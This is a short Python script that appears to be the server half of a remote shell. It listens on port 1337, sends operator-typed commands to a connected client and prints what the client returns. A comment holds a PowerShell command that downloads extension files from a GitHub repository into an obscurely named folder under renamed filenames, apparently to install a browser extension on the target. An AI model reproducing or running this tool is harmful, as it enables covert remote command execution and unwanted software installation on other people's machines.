import socket
#command to downloads extensions:->
#mkdir potho ; cd potho ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/orimeged/Extensions/main/blocker.js" -OutFile "./p.js"  ; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/orimeged/Extensions/main/manifest.json" -OutFile "./p2.json"

server_socket = socket.socket()
server_socket.bind(("0.0.0.0", 1337))
server_socket.listen()
print("Server is up and running")
(client_socket, client_address) = server_socket.accept()
print("Client connected")
reply=" "
command = " "
while(reply != "exit_of_server"):
    reply = input()
    client_socket.send(reply.encode())
    if(reply == "power"):
        while(command != "exit_power"):
            print(">")
            command = input()
            client_socket.send(command.encode())
            output = client_socket.recv(1024).decode()
            print(output)



client_socket.close()
server_socket.close()